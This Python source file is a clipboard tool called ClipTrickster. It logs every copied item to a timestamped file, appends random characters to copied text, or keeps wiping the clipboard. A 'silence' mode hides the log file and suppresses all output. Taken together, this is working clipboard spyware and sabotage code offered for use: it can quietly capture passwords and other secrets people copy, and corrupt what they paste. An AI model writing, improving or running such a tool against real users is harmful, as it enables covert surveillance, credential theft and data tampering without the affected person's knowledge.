import pyperclip
import random
import time
import datetime
import threading
import os
import platform
import signal
import sys

# Configuration File Path
CONFIG_FILE = 'config.txt'
LOG_FILE = 'clipboard_log.txt'


class Colors:
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    RESET = '\033[0m'

shutdown_event = threading.Event()


# Read configuration
def read_config():
    with open(CONFIG_FILE, 'r') as file:
        lines = file.readlines()
        module = lines[0].strip().split(': ')[1]
        activity = lines[1].strip().split(': ')[1]
    return module, activity


# Write clipboard content to a file with timestamp
def log_clipboard_content(content):
    with open(LOG_FILE, 'a') as file:
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        file.write(f'{timestamp}:\n{content}\n\n')


# Constant monitoring of the clipboard
def monitor_clipboard():
    previous_content = None
    while not shutdown_event.is_set():
        try:
            current_content = pyperclip.paste()
            if current_content != previous_content:
                if previous_content is not None:
                    log_clipboard_content(current_content)
                previous_content = current_content
            time.sleep(1)
        except Exception as e:
            print(f"{Colors.RED}Error in monitor_clipboard: {e}{Colors.RESET}")


# Add random characters to the clipboard content
def add_random_characters(content):
    characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()'
    num_chars = random.randint(1, 5)
    random_chars = ''.join(random.choice(characters) for _ in range(num_chars))
    return content + random_chars


# Modify clipboard content continuously
def modify_clipboard():
    def background_task():
        previous_content = ''
        while not shutdown_event.is_set():
            try:
                current_content = pyperclip.paste()
                if current_content != previous_content:
                    modified_content = add_random_characters(current_content)
                    pyperclip.copy(modified_content)
                    previous_content = modified_content
                time.sleep(0.5)
            except Exception as e:
                print(f"{Colors.RED}Error in background_task: {e}{Colors.RESET}")

    # Start the background thread
    threading.Thread(target=background_task, daemon=True).start()


# Destroy clipboard content
def destroy_clipboard():
    while not shutdown_event.is_set():
        try:
            pyperclip.copy('')
            time.sleep(1)
        except Exception as e:
            print(f"{Colors.RED}Error in destroy_clipboard: {e}{Colors.RESET}")


# Hide or show the log file based on the mode
def handle_log_file(activity):
    if activity == 'silence':
        if platform.system() == 'Windows':
            os.system(f'attrib +h {LOG_FILE}')
        else:
            os.system(f'chmod 000 {LOG_FILE}')
    elif activity == 'normal':
        if platform.system() == 'Windows':
            os.system(f'attrib -h {LOG_FILE}')
        else:
            os.system(f'chmod 644 {LOG_FILE}')


# Print terminal artwork
def print_artwork():
    artwork = """
           ccee88oo
      C8O8O8Q8PoOb o8oo          ClipTrickster
     dOB69QO8PdUOpugoO9bD           is a Tool for 
    CgggbU8OU qOp qOdoUOdcb             Full clipboard: 
        6OuU  /p u gcoUodpP                Control,
          \\\//  /douUP                       Logging,
            \\\////                        Modification,
             |||/\                      Destruction.
             |||\/                   by Bohdan Misonh
             |||||                Version 1.0
       .....//||||\....
        """
    print(f"{Colors.CYAN}{artwork}{Colors.RESET}")


# Print mode-specific messages
def print_mode_message(mode, message):
    if mode == 'normal':
        print(f"{Colors.GREEN}{message}{Colors.RESET}")
    elif mode == 'silence':
        pass


# Handle termination signals
def handle_signal(signum, frame):
    print(f"\n{Colors.YELLOW}Terminating program gracefully...{Colors.RESET}")
    shutdown_event.set()


def main():
    module, activity = read_config()

    # Handle log file visibility
    handle_log_file(activity)

    print_mode_message(activity, 'Starting clipboard monitor...')

    # Register signal handlers for graceful termination
    signal.signal(signal.SIGINT, handle_signal)  # Handle Ctrl+C
    signal.signal(signal.SIGTERM, handle_signal)  # Handle termination signal

    if module == 'monitor':
        print_mode_message(activity, 'Monitoring clipboard and saving content...')
        monitor_clipboard()
    elif module == 'modify':
        print_mode_message(activity, 'Modifying clipboard content...')
        modify_clipboard()
    elif module == 'destroy':
        print_mode_message(activity, 'Destroying clipboard content...')
        destroy_clipboard()
    else:
        print(f"{Colors.RED}Invalid module specified in config file.{Colors.RESET}")

    if activity == 'normal':
        print_artwork()

    # Keep the main thread alive
    try:
        while not shutdown_event.is_set():
            time.sleep(1)
    except KeyboardInterrupt:
        handle_signal(signal.SIGINT, None)
    finally:
        print(f"{Colors.YELLOW}Program terminated.{Colors.RESET}")


if __name__ == '__main__':
    if not os.path.isfile(CONFIG_FILE):
        print(f"{Colors.RED}Configuration file {CONFIG_FILE} not found.{Colors.RESET}")
    else:
        main()